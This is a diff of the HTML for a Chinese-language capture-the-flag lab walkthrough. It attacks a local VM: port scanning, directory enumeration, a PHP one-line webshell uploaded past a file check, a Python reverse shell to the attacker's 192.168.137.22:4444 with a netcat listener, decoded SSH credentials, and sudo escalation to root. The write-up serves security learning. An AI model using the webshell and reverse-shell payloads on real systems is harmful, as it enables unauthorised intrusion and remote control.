@@ -5,23 +5,23 @@
 <p><strong>难度等级：</strong>低</p>
 <p><strong>打靶目标：</strong>取得 root 权限 + 2 Flag</p>
 </blockquote>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre class="line-numbers language-none"><code class="language-none">sudo arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093012124.png" alt="image-20220216093012124"></p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.233</span><br></pre></td></tr></table></figure>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p- 192.168.137.233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093201459.png" alt="image-20220216093201459"></p>
-<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80-sV -sC 192.168.137.233</span><br></pre></td></tr></table></figure>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p22,80-sV -sC 192.168.137.233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093937980.png" alt="image-20220216093937980"></p>
 <h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094324955.png" alt="image-20220216094324955"></p>
 <p>页面提示该网站正在建设中，但它已经在运行</p>
 <h4 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094548943.png" alt="image-20220216094548943"></p>
 <p>也并未发现有帮助的信息</p>
-<h4 id="whatweb网站指纹识别"><a href="#whatweb网站指纹识别" class="headerlink" title="whatweb网站指纹识别"></a>whatweb网站指纹识别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.137.233</span><br></pre></td></tr></table></figure>
+<h4 id="whatweb网站指纹识别"><a href="#whatweb网站指纹识别" class="headerlink" title="whatweb网站指纹识别"></a>whatweb网站指纹识别</h4><pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.137.233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094848943.png" alt="image-20220216094848943"></p>
-<h4 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.137.233</span><br></pre></td></tr></table></figure>
+<h4 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h4><pre class="line-numbers language-none"><code class="language-none">dirsearch -u http:&#x2F;&#x2F;192.168.137.233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095152430.png" alt="image-20220216095152430"></p>
 <p>结果显示了大量403响应码，也就意味着目标服务器上存在这些目录&#x2F;文件，但是因权限不足不能访问。</p>
@@ -109,7 +109,7 @@
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113517608.png" alt="image-20220216113517608"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113658637.png" alt="image-20220216113658637"></p>
 <p>写一句话木马a.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var ?&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $var&#x3D;shell_exec($_GET[&#39;cmd&#39;]); echo $var ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216114951617.png" alt="image-20220216114951617"></p>
 <p>初次上传发现服务端有对上传文件的校验</p>
@@ -128,10 +128,10 @@
 <p>为普通权限用户</p>
 <h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="查看目标服务器上是否有python"><a href="#查看目标服务器上是否有python" class="headerlink" title="查看目标服务器上是否有python"></a>查看目标服务器上是否有python</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216120212970.png" alt="image-20220216120212970"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.22&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.22&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>kali开启侦听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143055578.png" alt="image-20220216143055578"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216142807426.png" alt="image-20220216142807426"></p>
@@ -142,20 +142,22 @@
 <p>查看&#x2F;home目录</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143717439.png" alt="image-20220216143717439"></p>
 <p>拿到第一个flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h3><p>尝试base64解码</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143832430.png" alt="image-20220216143832430"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ssh : 
+user : yousef 
+pass : yousef123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>解码完成后信息显示是ssh的账号密码（之前端口扫描确实存在22端口的ssh）</p>
 <p>尝试连接</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144327107.png" alt="image-20220216144327107"></p>
 <h3 id="利用sudo提权"><a href="#利用sudo提权" class="headerlink" title="利用sudo提权"></a>利用sudo提权</h3><p>用户yousef有sudo权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>发现可以sudo执行所有命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144942569.png" alt="image-20220216144942569"></p>
 <p>(这里提权太简单了..)</p>
